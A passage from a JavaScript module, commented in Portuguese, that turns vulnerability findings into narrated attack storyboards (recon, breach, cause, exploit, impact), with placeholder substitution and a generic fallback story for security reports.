      url: u.origin + (u.pathname || '/'),
      resolved: true,
    }
  } catch {
    // location livre (ex.: "cabeçalho de resposta") — não dá para extrair alvo
    return { ...PADROES, resolved: false }
  }
}

/** Substitui `{host}`, `{path}`, `{port}` e `{url}` — só isso, nada de template genérico. */
function fill(valor, alvo) {
  if (typeof valor === 'string') {
    return valor.replace(/\{(host|path|port|url)\}/g, (m, k) => alvo[k] != null ? String(alvo[k]) : m)
  }
  if (Array.isArray(valor)) return valor.map((v) => fill(v, alvo))
  if (valor && typeof valor === 'object') {
    const saida = {}
    for (const k of Object.keys(valor)) saida[k] = fill(valor[k], alvo)
    return saida
  }
  return valor
}

/* ────────────────────────────────────────────────────────────────────────────
 * Fallback: storyboard derivado da lição quando a classe não tem roteiro próprio
 * ──────────────────────────────────────────────────────────────────────────── */

function storyboardGenerico(lesson, alvo) {
  return {
    recon: {
      narration: `O atacante mapeia ${alvo.host} em busca de pontos fracos e encontra esta condição: ${lesson.title.toLowerCase()}.`,
      probes: ['varredura da superfície exposta', 'identificação de tecnologias e versões', `análise de ${alvo.path}`],
      hit: lesson.title,
    },
    breach: {
      narration: lesson.why,
      request: [`GET ${alvo.path} HTTP/1.1`, `Host: ${alvo.host}`],
      response: ['HTTP/1.1 200 OK', '', '(condição vulnerável observada na resposta)'],
      flag: { side: 'response', line: 2, note: lesson.where },
    },
    cause: { narration: lesson.why, file: null, bad: null, good: null, note: lesson.where },
    exploit: {
      narration: 'A partir daqui o atacante encadeia esta condição com outras falhas do ambiente para avançar.',
      steps: [
        { label: 'confirma a condição', detail: 'valida que é explorável e não um falso positivo' },
        { label: 'encadeia com outros achados', detail: 'combina com falhas próximas para ganhar acesso' },
        { label: 'estabelece acesso persistente', detail: 'garante retorno mesmo após correções parciais' },
      ],
      loot: ['informação sobre o ambiente', 'acesso ampliado a partir do encadeamento'],
    },
    impact: {
      narration: lesson.impact,
      app: [lesson.impact],
      business: ['Exposição de dados e operação conforme o encadeamento com outras falhas'],
      legal: ['LGPD art. 46 — dever de adotar medidas de segurança adequadas'],
    },
  }
}

/* ────────────────────────────────────────────────────────────────────────────
 * API pública
 * ──────────────────────────────────────────────────────────────────────────── */

/**
 * Monta a história do ataque para um finding.
 *
 * @param {{id?:string,title:string,why:string,where:string,impact:string}} lesson — de `lessonFor()`
 * @param {{title?:string,location?:string|null,severity?:string,impact?:string}} finding
 * @returns {{id:string,title:string,scripted:boolean,acts:Array,
 *            target:{host:string,path:string,port:string,url:string,resolved:boolean}}}
 */
function storyFor(lesson, finding) {
  const alvo = parseTarget(finding && finding.location)
  const base = (lesson && lesson.id && STORIES[lesson.id]) || null
  const bruto = base ? fill(base, alvo) : storyboardGenerico(lesson, alvo)

  // O impacto escrito pelo agente para ESTE finding vale mais que o texto de
  // classe — entra como primeira consequência de aplicação quando existe.
  const impactoReal = finding && typeof finding.impact === 'string' ? finding.impact.trim() : ''
  if (impactoReal && !bruto.impact.app.includes(impactoReal)) {
    bruto.impact = { ...bruto.impact, app: [impactoReal, ...bruto.impact.app] }
  }

  return {
    id: (lesson && lesson.id) || 'generic',
    title: (lesson && lesson.title) || 'Vulnerabilidade',
    scripted: Boolean(base),
    target: alvo,
    acts: ACTS.map((meta) => ({ ...meta, ...bruto[meta.key] })),
  }
}

module.exports = { ACTS, STORIES, storyFor, parseTarget, fill }
